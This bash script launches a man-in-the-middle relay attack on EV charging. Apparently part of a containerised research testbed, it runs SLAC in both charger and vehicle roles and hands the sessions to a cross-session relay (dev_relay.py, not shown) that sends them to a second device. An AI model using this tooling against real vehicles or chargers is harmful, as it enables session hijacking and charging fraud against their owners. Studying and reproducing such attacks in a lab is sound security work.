#!/bin/bash
# Dev1-side SLAC (both local roles) + HLC (proxy/dev_relay.py) launcher --
# the EVExchange cross-session relay attack (see README "EVExchange
# cross-session relay", evexchange_attack.pdf). Dev1 sits between the
# victim's real EV (EVCC) and real charger (SECC), structurally identical
# to proxy_run_full.sh's dual SLAC-role setup, but hands off to
# dev_relay.py for HLC instead of proxy01.py -- a pure blind relay that
# cross-wires EVCC's/SECC's sessions over to Dev2 instead of relaying them
# straight through to each other. See dev_relay.py's own docstring for the
# full explanation.
#
# Which of this container's interfaces are proxy_net1/proxy_net2 is
# resolved by subnet at runtime, NOT assumed by name -- same principle as
# everywhere else in this repo.
set -uo pipefail

resolve_iface() {
    local v4_prefix="$1" v6_prefix="$2"
    ip -br a | grep -E "${v4_prefix}|${v6_prefix}" | awk '{print $1}' | cut -d@ -f1 | head -n1
}

PROXY_NET1_IFACE="$(resolve_iface '172\.20\.' '2001:db8:1:')"   # SECC-facing (victim's charger)
PROXY_NET2_IFACE="$(resolve_iface '172\.19\.' '2001:db8:2:')"   # EVCC-facing (victim's EV)

if [ -z "$PROXY_NET1_IFACE" ]; then
    echo "WARNING: no interface found on proxy_net1 (172.20.0.0/16 / 2001:db8:1::/64), falling back to eth0" >&2
    PROXY_NET1_IFACE="eth0"
fi
if [ -z "$PROXY_NET2_IFACE" ]; then
    echo "WARNING: no interface found on proxy_net2 (172.19.0.0/16 / 2001:db8:2::/64), falling back to eth1" >&2
    PROXY_NET2_IFACE="eth1"
fi

echo "=== [1/2] AcCCS SLAC, both roles, concurrently ==="
echo "    PEV role  (vs. real SECC)  on $PROXY_NET1_IFACE (proxy_net1)"
echo "    EVSE role (vs. real EVCC)  on $PROXY_NET2_IFACE (proxy_net2)"
cd /usr/src/app/mod_acccs
SLAC_ONLY=1 timeout 20 python PEV.py -I "$PROXY_NET1_IFACE" &
PEV_PID=$!
SLAC_ONLY=1 timeout 20 python EVSE.py -I "$PROXY_NET2_IFACE" &
EVSE_PID=$!
wait "$PEV_PID"
echo "=== Dev1 PEV-role SLAC exited with code $? ==="
wait "$EVSE_PID"
echo "=== Dev1 EVSE-role SLAC exited with code $? — proceeding to HLC regardless ==="

echo "=== [2/2] HLC cross-session relay (dev_relay.py), peer = Dev2 ==="
cd /usr/src/app/iso15118
# /venv/bin/python3, not bare python3: dev_relay.py imports
# iso15118.shared.messages.{sdp,v2gtp,enums}, which need pydantic -- only
# present in /venv (where the iso15118 wheel's own dependencies were
# installed), not the base image's system python3.
exec /venv/bin/python3 dev_relay.py \
    --secc-net-v4 172.20.0.0/16 --secc-net-v6 2001:db8:1::/64 \
    --evcc-net-v4 172.19.0.0/16 --evcc-net-v6 2001:db8:2::/64 \
    --peer-host Dev2 --capture --show-hex
